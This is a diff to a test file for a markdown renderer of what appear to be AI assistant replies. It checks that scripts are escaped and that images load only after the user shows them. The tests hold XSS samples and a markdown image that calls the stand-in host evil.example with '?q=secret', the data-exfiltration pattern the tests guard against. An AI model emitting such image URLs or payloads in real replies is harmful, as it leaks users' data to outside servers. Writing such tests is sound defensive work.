@@ -1,5 +1,5 @@
 import { expect, test } from "bun:test";
-import { renderMarkdown } from "./markdown.ts";
+import { renderMarkdown, showImage } from "./markdown.ts";
 
 test("HTML in a reply is shown as text, not run", () => {
   const html = renderMarkdown('Hi <img src=x onerror="alert(1)"> <script>alert(2)</script>');
@@ -17,10 +17,19 @@ test("links open the web only, in the browser", () => {
   expect(js).toContain("click");
 });
 
-test("images aren't loaded: a reply can't send data to a server by naming it in a URL", () => {
-  const html = renderMarkdown("![secret](https://evil.example/?q=secret)");
+test("an image loads only once shown: a reply can't, unseen, send data by naming it in a URL", () => {
+  const md = "![chart](https://evil.example/?q=secret)";
+  const html = renderMarkdown(md);
   expect(html).not.toContain("<img");
-  expect(html).toContain('<a href="https://evil.example/?q=secret"');
+  expect(html).toContain('class="show-image" data-src="https://evil.example/?q=secret"');
+  expect(html).toContain("evil.example");
+  showImage("https://evil.example/?q=secret");
+  expect(renderMarkdown(md)).toContain(
+    '<img class="reply-image" src="https://evil.example/?q=secret"',
+  );
+  // Not over https: never.
+  expect(renderMarkdown("![x](http://example.com/a.png)")).not.toContain("show-image");
+  expect(renderMarkdown('![x"><b>](https://e.example/a.png)')).not.toContain("<b>");
 });
 
 test("code blocks are escaped, named and copyable, highlighted or not", async () => {
